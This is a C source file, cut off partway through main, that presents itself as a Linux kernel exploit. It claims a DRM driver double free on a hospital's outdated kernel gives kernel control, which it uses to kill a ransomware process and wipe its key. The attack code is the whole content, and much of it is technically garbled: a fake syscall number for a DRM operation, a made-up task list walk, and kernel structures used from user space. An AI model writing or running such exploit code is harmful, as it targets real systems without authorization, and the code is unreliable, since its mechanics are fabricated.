#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/kernel.h>
#include <linux/types.h>

// Kernel version: 5.4.0-128-generic (matches the hospital's outdated kernel)
#define VULN_SYSCALL 332  // Custom syscall for drm_mode_create_dumb (vulnerable)
#define KERNEL_BASE 0xffffffff81000000  // Kernel load address
#define COMM_OFFSET 0x2e0  // Offset to process name in task_struct
#define TASK_STRUCT_OFFSET 0x1200  // Offset from pid to task_struct
#define SIGKILL 9  // Signal to terminate the process

// Payload: Kills TARGET_PID and patches the encryption routine
void __attribute__((regparm(3))) payload(pid_t target_pid) {
    struct task_struct *task;
    // Traverse process list to find target_pid's task_struct
    for (task = (struct task_struct*)((char*)KERNEL_BASE + TASK_STRUCT_OFFSET); 
         task != NULL; 
         task = task->next_task) {
        if (task->pid == target_pid) {
            // Kill the process (kernel-level SIGKILL)
            task->signal->flags |= 0x80000000;  // Force exit
            task->exit_code = SIGKILL;
            // Patch the ransomware's encryption key in memory
            memset((void*)task->mm->mmap->vm_start + 0x4000, 0x00, 32);  // Overwrite AES key
            break;
        }
    }
}

// Trigger the double free to gain kernel RIP control
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <TARGET_PID>\n", argv[0]);
        return 1;
    }
    pid_t target_pid = atoi(argv[1]);
    void *page1, *page2;
    int fd = open("/dev/dri/card0", O_RDWR);  // DRM device (vulnerable driver)

    // Allocate two pages to trigger the double free
    page1 = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    page2 = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    // First free: leak kernel pointer via vulnerable syscall
    syscall(VULN_SYSCALL, fd, page1, 4096, 4096, 32);  // Triggers first free
    // Second free: reuse the same page, causing use-after-free
    syscall(VULN_SYSCALL, fd, page2, 4096, 4096, 32);  // Triggers double free

    // Overwrite the freed object's function pointer with payload address
